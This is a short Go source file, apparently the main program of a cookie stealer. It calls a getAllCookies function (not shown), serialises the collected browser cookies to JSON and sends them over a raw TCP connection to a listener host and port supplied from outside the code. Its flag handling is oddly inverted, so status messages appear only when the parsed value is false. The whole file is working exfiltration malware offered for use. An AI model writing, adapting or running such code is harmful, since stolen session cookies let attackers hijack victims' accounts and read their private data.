package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
)

var (
	host string
	port string

	verbose string
)

func main() {
	verbose := func(quiet string) bool {
		if quiet == "false" {
			return true
		}
		return false
	}(verbose)

	if !verbose {
		fmt.Printf("Connecting to remote server at %v:%v\n", host, port)
	}

	cookies := getAllCookies()

	// convert cookies to json bytes
	jsonBytes, err := json.Marshal(cookies)
	if err != nil {
		if !verbose {
			log.Fatalf("[!] Error marshalling cookies: %v", err)
		}
	}

	// send json bytes to listener
	conn, err := net.Dial("tcp", fmt.Sprintf("%v:%v", host, port))
	if err != nil {
		if !verbose {
			log.Fatalf("[!] Error dialing listener: %v", err)
		}
	}

	_, err = conn.Write(jsonBytes)
	if err != nil {
		if !verbose {
			log.Fatalf("[!] Error writing to listener: %v", err)
		}
	}
}
